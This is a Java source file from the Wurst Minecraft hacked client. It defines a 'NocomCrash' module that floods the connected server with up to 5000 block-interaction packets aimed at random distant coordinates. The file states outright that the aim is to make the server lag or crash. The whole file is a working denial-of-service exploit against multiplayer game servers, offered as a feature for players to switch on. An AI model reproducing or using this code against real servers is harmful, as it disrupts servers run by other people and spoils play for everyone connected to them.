/*
 * Copyright (c) 2014-2022 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import java.util.Objects;
import java.util.Random;

import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.settings.SliderSetting;
import net.wurstclient.settings.SliderSetting.ValueDisplay;
import net.wurstclient.util.ChatUtils;

@SearchTags({ "server crasher", "nocom crash", "lag" })
public final class NocomCrashHack extends Hack {
	Random rand = new Random();

	private final SliderSetting packets = new SliderSetting("Number of packets", 500, 1, 5000, 1, ValueDisplay.INTEGER);

	public NocomCrashHack() {
		super("NocomCrash");
		setCategory(Category.OTHER);
		addSetting(packets);
	}

	@Override
	public void onEnable() {
		ChatUtils.message("Sending packets. Will take approximately "
				+ packets.getValueI() * 10 + "ms");

		Thread t = new Thread(() -> {
			try {
				for (int i = 0; i < packets.getValueI(); i++) {
					// display current packet
					if (i % 100 == 0 || i == packets.getValueI())
						ChatUtils.message(String.format("%d/%d", i, packets.getValueI()));

					if (MC.getNetworkHandler() == null)
						break;

					Thread.sleep(10L);

					// generate and send the packet
					Vec3d cpos = pickRandomPos();
					PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND,
							new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
					((ClientPlayNetworkHandler) Objects.requireNonNull(MC.getNetworkHandler())).sendPacket(packet);
				}

				ChatUtils.message("Done sending, server should start to lag");
			} catch (Exception e) {
				e.printStackTrace();
				ChatUtils.error("Failed to crash, caught " + e.getClass().getSimpleName() + ".");
			}

			setEnabled(false);
		});

		t.start();
	}

	private Vec3d pickRandomPos() {
		int x = rand.nextInt(16777215);
		int y = 255;
		int z = rand.nextInt(16777215);
		return new Vec3d(x, y, z);
	}
}
